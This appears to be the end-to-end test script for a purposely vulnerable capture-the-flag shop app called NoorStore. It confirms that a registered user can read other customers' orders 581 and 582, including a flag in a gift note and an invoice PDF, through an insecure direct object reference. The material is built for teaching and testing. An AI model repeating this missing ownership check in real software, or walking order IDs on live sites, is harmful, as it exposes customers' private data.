// End-to-end workshop verification for NoorStore.
// Runs the compiled Worker (dist/) against an in-memory SQLite DB exposed
// through a D1-compatible shim, then drives the full workflow:
// register → login → checkout → own order → IDOR 581 → IDOR 582 (flag).
import { DatabaseSync } from "node:sqlite";
import { readFileSync, readdirSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const ROOT = join(HERE, "..");
// Assemble at runtime so this file itself never contains the marker literally.
const MARKER = String.fromCharCode(83, 68, 67, 123); // flag prefix
const FLAG_RE = new RegExp("^" + MARKER + ".+}$");

// ---- D1-compatible shim over node:sqlite ----
function makeD1(db) {
  return {
    prepare(sql) {
      let params = [];
      return {
        bind(...args) { params = args; return this; },
        async first() {
          const row = db.prepare(sql).get(...params);
          return row === undefined ? null : row;
        },
        async all() {
          return { results: db.prepare(sql).all(...params) };
        },
        async run() {
          const info = db.prepare(sql).run(...params);
          return { success: true, meta: { last_row_id: Number(info.lastInsertRowid), changes: Number(info.changes) } };
        },
      };
    },
    async exec(sql) { db.exec(sql); return {}; },
    async batch(stmts) { return Promise.all(stmts.map((s) => s.run())); },
  };
}

const db = new DatabaseSync(":memory:");
const D1 = makeD1(db);
// Apply real migrations in order (same files wrangler uses).
for (const f of ["0001_schema.sql", "0002_seed.sql"]) {
  db.exec(readFileSync(join(ROOT, "migrations", f), "utf8"));
}

const worker = (await import("../dist/index.js")).default;
const { APP_CSS, APP_JS } = await import("../dist/html.js");
const env = { DB: D1 }; // no FLAG secret -> deterministic fallback flag path

let cookie = "";
function storeCookies(res) {
  const getSet = typeof res.headers.getSetCookie === "function" ? res.headers.getSetCookie() : [];
  const raw = getSet.length ? getSet : [res.headers.get("set-cookie")].filter(Boolean);
  for (const c of raw) {
    const m = String(c).match(/session=([^;]*)/);
    cookie = m && m[1] ? `session=${m[1]}` : "";
  }
}
async function req(path, opts = {}) {
  const headers = { ...(opts.headers || {}) };
  if (cookie) headers.Cookie = cookie;
  const init = { method: opts.method || "GET", headers };
  if (opts.body !== undefined) init.body = opts.body;
  const res = await worker.fetch(new Request("http://localhost" + path, init), env, {});
  storeCookies(res);
  return res;
}
const j = async (r) => JSON.parse(await r.text());

let pass = 0, fail = 0;
function check(name, cond, extra = "") {
  if (cond) { pass++; console.log(`  PASS ${name}`); }
  else { fail++; console.log(`  FAIL ${name} ${extra}`); }
}

console.log("== NoorStore workflow verification ==");

// 1. Storefront + products API
{
  const r = await req("/api/products");
  const d = await j(r);
  check("products list returns 8 seeded products", r.status === 200 && d.products?.length === 8, `status=${r.status}`);
  check("products leak no flag", !JSON.stringify(d).includes(MARKER));
  const home = await (await req("/")).text();
  check("landing page renders", home.includes("NoorStore"));
  check("landing page leaks no flag", !home.includes(MARKER));
}

// 2. Auth required for the vulnerable endpoint
{
  cookie = "";
  const r = await req("/api/orders/582");
  check("unauthenticated order access is rejected (401)", r.status === 401, `status=${r.status}`);
}

// 3. Register + login
{
  const r = await req("/api/register", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ name: "Attacker One", email: "attacker@example.com", password: "AttackerPass123!" }) });
  const d = await j(r);
  check("new user can register (201 + session)", r.status === 201 && !!d.user?.id && !!cookie, `status=${r.status}`);
  const me = await j(await req("/api/me"));
  check("session identifies the new user", me.user?.email === "attacker@example.com", JSON.stringify(me));
  const dup = await req("/api/register", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ name: "Dup", email: "attacker@example.com", password: "AttackerPass123!" }) });
  check("duplicate email rejected (409)", dup.status === 409, `status=${dup.status}`);
  const bad = await req("/api/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email: "attacker@example.com", password: "wrong-password" }) });
  check("wrong password rejected (401)", bad.status === 401, `status=${bad.status}`);
}

// 4. Checkout creates a real order
let ownId = 0;
{
  const r = await req("/api/orders", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ items: [{ product_id: 1, qty: 1 }, { product_id: 8, qty: 2 }], address: "Riyadh, Test district, Street 5", phone: "+966500000001" }) });
  const d = await j(r);
  ownId = d.id;
  check("checkout creates order (total = 34900 + 2*12900)", r.status === 201 && ownId > 582 && d.total_cents === 34900 + 2 * 12900, `status=${r.status} body=${JSON.stringify(d)}`);
}

// 5. My-orders list is correctly scoped (secure) and flag-free
{
  const d = await j(await req("/api/orders"));
  const ids = (d.orders || []).map((o) => o.id);
  check("order list shows own order only", ids.includes(ownId) && !ids.includes(581) && !ids.includes(582), `ids=${ids}`);
  check("order list has no private notes/flag", !JSON.stringify(d).includes(MARKER) && !(d.orders || []).some((o) => "gift_note" in o));
}

// 6. Own order detail works normally
{
  const r = await req(`/api/orders/${ownId}`);
  const d = await j(r);
  check("own order detail works", r.status === 200 && d.order?.id === ownId && d.order?.owner_name === "Attacker One", `status=${r.status}`);
  check("own order has no flag", !JSON.stringify(d).includes(MARKER));
}

// 7. THE ATTACK: /orders/581/ -> /orders/582/
let flag = "";
{
  const r581 = await req("/api/orders/581");
  const d581 = await j(r581);
  check("IDOR step 1: another user's order 581 is readable", r581.status === 200 && d581.order?.owner_name === "Layla Hassan", `status=${r581.status}`);
  const r582 = await req("/api/orders/582");
  const d582 = await j(r582);
  const note = d582.order?.gift_note || "";
  const m = note.match(new RegExp(MARKER + "(.+)}"));
  if (m) flag = MARKER + m[1] + "}";
  check("IDOR step 2: victim order 582 leaks the flag", r582.status === 200 && FLAG_RE.test(flag), `status=${r582.status} note=${note.slice(0, 60)}...`);
  check("compromised order belongs to another user", d582.order?.owner_name === "Layla Hassan" && d582.order?.owner_email_masked?.includes("***"));
}

// 8. Invoice PDF of the target also carries the business note
{
  const r = await req("/api/orders/582/invoice");
  const buf = Buffer.from(await r.arrayBuffer());
  check("invoice downloads as PDF", r.status === 200 && (r.headers.get("content-type") || "").includes("application/pdf") && buf.subarray(0, 4).toString() === "%PDF", `status=${r.status}`);
  check("invoice references order 582", buf.includes("582"));
  check("invoice contains the flag (same business note)", !!flag && buf.includes(flag));
  const unauth = await (async () => { const saved = cookie; cookie = ""; const x = await req("/api/orders/582/invoice"); cookie = saved; return x; })();
  check("invoice requires login (401 unauthenticated)", unauth.status === 401, `status=${unauth.status}`);
  const missing = await req("/api/orders/99999");
  check("missing order returns 404", missing.status === 404, `status=${missing.status}`);
}

// 9. Normal UI + repo hygiene: flag appears nowhere it shouldn't
{
  const shell = await (await req("/orders/581")).text();
  check("order HTML shell leaks no flag", !shell.includes(MARKER));
  const files = [];
  for (const dir of ["migrations", "src", "dist", "public"]) {
    for (const f of readdirSync(join(ROOT, dir))) files.push(join(ROOT, dir, f));
  }
  const dirty = files.filter((f) => { try { return readFileSync(f, "utf8").includes(MARKER); } catch { return false; } });
  check("no flag literal in migrations/src/dist/public", dirty.length === 0, dirty.join(", "));
  check("public/app.css mirrors embedded CSS", readFileSync(join(ROOT, "public", "app.css"), "utf8").trim() === String(APP_CSS).trim());
  check("public/app.js mirrors embedded JS", readFileSync(join(ROOT, "public", "app.js"), "utf8").trim() === String(APP_JS).trim());
}

console.log(`\n== ${pass} passed, ${fail} failed ==`);
if (flag) console.log(`Flag obtained ONLY via IDOR on /api/orders/582 (length ${flag.length}).`);
process.exit(fail ? 1 : 0);
